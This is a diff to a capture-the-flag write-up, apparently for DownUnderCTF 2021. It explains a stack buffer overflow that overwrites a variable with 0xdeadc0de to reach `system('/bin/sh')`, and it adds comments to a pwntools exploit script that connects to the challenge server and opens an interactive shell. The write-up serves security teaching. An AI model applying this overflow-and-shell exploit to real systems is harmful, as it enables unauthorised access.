@@ -29,17 +29,25 @@ This means that we can overflow the `local_28` array and overwrite the `local_10
 
 Later in `main()`, we can see that `local_10` needs to be `0xdeadc0de` to give us a shell (via the `system("/bin/sh")` call).
 
-*pwntools* can help here. A Python script we created that does what we want is:
+*pwntools* can help here. I wrote a Python script to connect to the `nc` address, create a payload and send it to the waiting server:
 ```python
 from pwn import *
 
-context.update(arch='x86_64', os='linux')
+# Set the context to 64-bit
+context.update(arch='amd64', os='linux')
 
+# Connect to the server
 p = remote('pwn-2021.duc.tf', 31916)
 
+# Create and send the payload:
+# 24 characters to fill the buffer, and then
+# pack the 32-bit integer 0xdeadc0de - ensures the integer
+# is set to the correct endianness for our context
 payload = cyclic(24) + p32(0xdeadc0de)
 p.sendline(payload)
 
+# Switch to interactive mode so we can work with the
+# shell (if we get it)
 p.interactive()
 ```
 
